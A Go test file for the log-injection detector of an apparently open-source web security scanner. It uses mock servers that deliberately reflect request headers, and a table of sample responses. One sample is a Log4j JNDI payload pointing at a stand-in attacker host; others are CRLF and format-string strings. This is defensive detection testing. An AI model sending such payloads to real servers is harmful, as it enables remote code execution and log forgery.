package loginj

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	internalhttp "github.com/TyrusRC/swiss-knife-for-web-security/internal/http"
)

func TestDetector_Name(t *testing.T) {
	client := internalhttp.NewClient()
	detector := New(client)
	if detector.Name() != "log-injection" {
		t.Errorf("Name() = %q, want %q", detector.Name(), "log-injection")
	}
}

func TestDetector_Description(t *testing.T) {
	client := internalhttp.NewClient()
	detector := New(client)
	desc := detector.Description()
	if desc == "" {
		t.Error("Description() should not be empty")
	}
}

func TestDetector_DetectCRLFInjection(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Vulnerable: reflects User-Agent in response headers (CRLF injection)
		ua := r.Header.Get("User-Agent")
		if strings.Contains(ua, "\r\n") || strings.Contains(ua, "INJECTED") {
			// Simulate the injected content appearing in response
			w.Header().Set("X-Logged-UA", ua)
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(fmt.Sprintf(`{"logged_ua": "%s"}`, ua)))
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status": "ok"}`))
	}))
	defer server.Close()

	client := internalhttp.NewClient()
	detector := New(client)

	result, err := detector.Detect(ctx(t), server.URL+"/api/action", "", "GET", DetectOptions{
		MaxPayloads: 20,
	})

	if err != nil {
		t.Fatalf("Detect failed: %v", err)
	}

	if !result.Vulnerable {
		t.Error("Expected CRLF log injection vulnerability to be detected")
	}

	if len(result.Findings) == 0 {
		t.Error("Expected at least one finding")
	}
}

func TestDetector_DetectFormatStringViaReferer(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ref := r.Header.Get("Referer")
		if ref != "" && ref != "https://example.com" {
			// Simulate reflecting the Referer in an error page
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(fmt.Sprintf(`{"referer_logged": "%s"}`, ref)))
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status": "ok"}`))
	}))
	defer server.Close()

	client := internalhttp.NewClient()
	detector := New(client)

	result, err := detector.Detect(ctx(t), server.URL+"/api/action", "", "GET", DetectOptions{
		MaxPayloads: 30,
	})

	if err != nil {
		t.Fatalf("Detect failed: %v", err)
	}

	if !result.Vulnerable {
		t.Error("Expected log injection vulnerability to be detected via Referer header")
	}
}

func TestDetector_DetectXForwardedForInjection(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		xff := r.Header.Get("X-Forwarded-For")
		if xff != "" && xff != "127.0.0.1" {
			// Simulate reflecting X-Forwarded-For in response
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(fmt.Sprintf(`{"client_ip": "%s"}`, xff)))
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status": "ok"}`))
	}))
	defer server.Close()

	client := internalhttp.NewClient()
	detector := New(client)

	result, err := detector.Detect(ctx(t), server.URL+"/api/action", "", "GET", DetectOptions{
		MaxPayloads: 30,
	})

	if err != nil {
		t.Fatalf("Detect failed: %v", err)
	}

	if !result.Vulnerable {
		t.Error("Expected log injection vulnerability to be detected via X-Forwarded-For")
	}
}

func TestDetector_SafeServer(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Safe server: sanitizes all headers and does not reflect them
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status": "safe response"}`))
	}))
	defer server.Close()

	client := internalhttp.NewClient()
	detector := New(client)

	result, err := detector.Detect(ctx(t), server.URL+"/api/action", "", "GET", DetectOptions{
		MaxPayloads: 5,
	})

	if err != nil {
		t.Fatalf("Detect failed: %v", err)
	}

	if result.Vulnerable {
		t.Error("Expected no vulnerability in safe server")
	}
}

func TestDetector_EmptyTarget(t *testing.T) {
	client := internalhttp.NewClient()
	detector := New(client)

	result, err := detector.Detect(ctx(t), "", "", "GET", DetectOptions{
		MaxPayloads: 5,
	})

	if err == nil {
		t.Error("Expected error with empty target")
	}

	if result != nil && result.Vulnerable {
		t.Error("Should not report vulnerability for empty target")
	}
}

func TestDetector_ContextCancellation(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(100 * time.Millisecond)
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status": "ok"}`))
	}))
	defer server.Close()

	client := internalhttp.NewClient()
	detector := New(client)

	cancelCtx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()

	_, err := detector.Detect(cancelCtx, server.URL+"/api/action", "", "GET", DetectOptions{
		MaxPayloads: 100,
	})

	if err == nil {
		t.Error("Expected context cancellation error")
	}
}

func TestDetector_WithVerbose(t *testing.T) {
	client := internalhttp.NewClient()
	detector := New(client).WithVerbose(true)

	if !detector.verbose {
		t.Error("WithVerbose(true) should set verbose to true")
	}
}

func TestDetectOptions_Default(t *testing.T) {
	opts := DefaultOptions()

	if opts.MaxPayloads != 30 {
		t.Errorf("DefaultOptions().MaxPayloads = %d, want 30", opts.MaxPayloads)
	}
	if !opts.IncludeWAFBypass {
		t.Error("DefaultOptions().IncludeWAFBypass should be true")
	}
	if opts.Timeout != 10*time.Second {
		t.Errorf("DefaultOptions().Timeout = %v, want 10s", opts.Timeout)
	}
}

func TestDetectionResult_Fields(t *testing.T) {
	result := &DetectionResult{
		Vulnerable:     true,
		TestedPayloads: 10,
	}

	if !result.Vulnerable {
		t.Error("Vulnerable should be true")
	}
	if result.TestedPayloads != 10 {
		t.Errorf("TestedPayloads = %d, want 10", result.TestedPayloads)
	}
}

func TestDetector_ErrorPatterns(t *testing.T) {
	tests := []struct {
		name       string
		response   string
		vulnerable bool
	}{
		{
			name:       "CRLF in response",
			response:   "test\r\nINJECTED_LOG_ENTRY",
			vulnerable: true,
		},
		{
			name:       "Log4j JNDI pattern",
			response:   "${jndi:ldap://evil.com/a}",
			vulnerable: true,
		},
		{
			name:       "Format string evidence",
			response:   "printed: %s%s%s%n output",
			vulnerable: true,
		},
		{
			name:       "Normal response",
			response:   `{"status": "ok", "data": "clean"}`,
			vulnerable: false,
		},
		{
			name:       "Empty response",
			response:   "",
			vulnerable: false,
		},
	}

	client := internalhttp.NewClient()
	detector := New(client)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.AnalyzeResponse(tt.response)
			if result.IsVulnerable != tt.vulnerable {
				t.Errorf("AnalyzeResponse() vulnerable = %v, want %v", result.IsVulnerable, tt.vulnerable)
			}
		})
	}
}

func TestDetector_OWASPMapping(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ua := r.Header.Get("User-Agent")
		if ua != "" && ua != "SKWS/1.0" {
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(fmt.Sprintf(`{"logged": "%s"}`, ua)))
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status": "ok"}`))
	}))
	defer server.Close()

	client := internalhttp.NewClient()
	detector := New(client)

	result, err := detector.Detect(ctx(t), server.URL+"/api/action", "", "GET", DetectOptions{
		MaxPayloads: 20,
	})

	if err != nil {
		t.Fatalf("Detect failed: %v", err)
	}

	if !result.Vulnerable || len(result.Findings) == 0 {
		t.Skip("No vulnerability detected, skipping OWASP mapping test")
	}

	finding := result.Findings[0]

	if len(finding.WSTG) == 0 || finding.WSTG[0] != "WSTG-INPV-14" {
		t.Errorf("Expected WSTG-INPV-14 mapping, got %v", finding.WSTG)
	}

	if len(finding.CWE) == 0 || finding.CWE[0] != "CWE-117" {
		t.Errorf("Expected CWE-117 mapping, got %v", finding.CWE)
	}
}

func TestDetector_FindingCreation(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ua := r.Header.Get("User-Agent")
		if ua != "" && ua != "SKWS/1.0" {
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(fmt.Sprintf(`{"logged": "%s"}`, ua)))
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status": "ok"}`))
	}))
	defer server.Close()

	client := internalhttp.NewClient()
	detector := New(client)

	result, err := detector.Detect(ctx(t), server.URL+"/api/action", "", "GET", DetectOptions{
		MaxPayloads: 20,
	})

	if err != nil {
		t.Fatalf("Detect failed: %v", err)
	}

	if !result.Vulnerable || len(result.Findings) == 0 {
		t.Skip("No vulnerability detected, skipping finding validation")
	}

	finding := result.Findings[0]

	if finding.Type != "Log Injection" {
		t.Errorf("Finding.Type = %q, want %q", finding.Type, "Log Injection")
	}

	if finding.Tool != "loginj-detector" {
		t.Errorf("Finding.Tool = %q, want %q", finding.Tool, "loginj-detector")
	}

	if finding.Remediation == "" {
		t.Error("Finding.Remediation should not be empty")
	}

	if finding.Description == "" {
		t.Error("Finding.Description should not be empty")
	}

	if finding.Evidence == "" {
		t.Error("Finding.Evidence should not be empty")
	}
}

func TestDetector_BaselineError(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`ok`))
	}))
	server.Close()

	client := internalhttp.NewClient()
	detector := New(client)

	_, err := detector.Detect(ctx(t), server.URL+"/api/action", "", "GET", DetectOptions{
		MaxPayloads: 5,
	})

	if err == nil {
		t.Error("Expected error when baseline request fails")
	}
}

func TestDetector_WithNoWAFBypass(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status": "ok"}`))
	}))
	defer server.Close()

	client := internalhttp.NewClient()
	detector := New(client)

	result, err := detector.Detect(ctx(t), server.URL+"/api/action", "", "GET", DetectOptions{
		MaxPayloads:      10,
		IncludeWAFBypass: false,
	})

	if err != nil {
		t.Fatalf("Detect failed: %v", err)
	}

	if result.TestedPayloads == 0 {
		t.Error("Expected payloads to be tested")
	}
}

// ctx creates a background context for tests.
func ctx(t *testing.T) context.Context {
	t.Helper()
	return context.Background()
}
